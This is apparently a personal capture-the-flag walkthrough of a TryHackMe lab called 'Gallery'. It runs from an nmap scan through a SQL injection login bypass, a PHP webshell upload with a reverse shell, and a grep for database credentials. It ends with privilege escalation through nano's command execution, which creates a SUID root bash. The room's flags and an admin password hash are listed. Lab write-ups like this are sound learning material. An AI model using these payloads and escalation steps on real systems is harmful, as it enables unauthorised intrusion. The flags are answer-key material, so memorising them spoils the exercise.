# Gallery Walkthrough 

<img width="1641" height="1013" alt="gallery" src="https://github.com/user-attachments/assets/8f73718b-4bb4-4442-89f1-e3d17c2b17c2" />
__________________________________________________________________________________________________________________________________________

### Recon

Nmap Scan shows 3 ports open. 


```

root@ip-10-201-127-248:~# nmap -sC -sV 10.201.116.181
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-15 20:31 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.201.116.181
Host is up (0.00027s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Simple Image Gallery System
MAC Address: 16:FF:FB:81:E7:17 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds

```

Open http://10.201.116.181:8080/gallery/login.php in a browser and inspect the login XHR (DevTools → Network). The login response showed the exact SQL query used by the app:

`SELECT * from users where username = 'admin' and password = md5('password')`

<img width="1419" height="870" alt="image" src="https://github.com/user-attachments/assets/25babc80-b0a4-40a9-ad0c-83602b6f1c08" />

<img width="1407" height="254" alt="image" src="https://github.com/user-attachments/assets/5d9d87df-fa08-4950-8800-2a09b3f75ffa" />

I went through a rabbit whole of:

 Simple Image Gallery 1.0 - Remote Code Execution (RCE) (50214.py) and an SQLi entry. I chose to try the RCE exploit. I was able to run commands in the browser, but it wasn't leading anywhere, so I decided to try an SQL injeciton on the login page.. it was from the 50214.py 
 ' ADMIN OR '1'='1' --  
 might have been ' ADMIN OR '1'='1# ' 

 This lead to a successful login.

 The gallery application exposes an image upload feature. The application failed to properly validate/handle uploaded files, allowing me to upload a PHP file and execute it. Using that, I established a reverse shell to my AttackBox and gained www-data on the target.

 From the www-data shell, searched the webroot for DB config and md5 usage:

 `grep -Rni "DB_PASS\|DB_USER\|DB_NAME\|md5(" /var/www 2>/dev/null`


<img width="1489" height="546" alt="1 flaG 1" src="https://github.com/user-attachments/assets/093cf825-868b-4af6-8a33-509a766e841e" />



### How many ports are open?

`3`

Correct Answer
### What's the name of the CMS?

`Simple Image Gallery`


### What's the hash password of the admin user?

`a228b12a08b6527e7978cbe5d914531c`
_________________________________________________________________________

### Priv Escalation

Found mike’s password exposed in a backup/.bash_history file

<img width="1488" height="339" alt="mike pass" src="https://github.com/user-attachments/assets/1e546628-aac6-4686-8d94-0604e7a08565" />


User mike may run the following commands on ip-10-201-116-181:
  `(root) NOPASSWD: /bin/bash /opt/rootkit.sh`
  
Copied or opened the script to see what it does (readable by mike):
`cp /opt/rootkit.sh /tmp/rootkit.sh.bak
sed -n '1,240p' /tmp/rootkit.sh.bak`

The script presented a small menu; the read option executed
`read) /bin/nano /root/report.txt;;`

When nano /root/report.txt opens (as root), press:

```
Ctrl+R (Read file)

then Ctrl+X (Execute command)
```

At the Execute command to insert output: prompt, run:
`cp /bin/bash /tmp/rootsh; chmod 4755 /tmp/rootsh`



<img width="1501" height="740" alt="image" src="https://github.com/user-attachments/assets/c7c8e65e-f870-4e93-9e3d-00ed42f8d06d" />

Summary:

Upload/RCE → PHP webshell → www-data.

Found DB creds in initialize.php → mysql dump → admin MD5 a228...531c.

Found mike’s password in backup/history → su - mike.

sudo -l showed NOPASSWD for /bin/bash /opt/rootkit.sh.

rootkit.sh opened nano as root; used nano’s command-execute feature to create a SUID bash and get root → read /root/root.txt.


- note: root gives a wierd shell line on this.. so just cd into the directory and the edit it.. dont try to cat it or it will not come out right.

 
### What's the user flag?

`THM{af05cd30bfed67849befd546ef}`





`THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}`
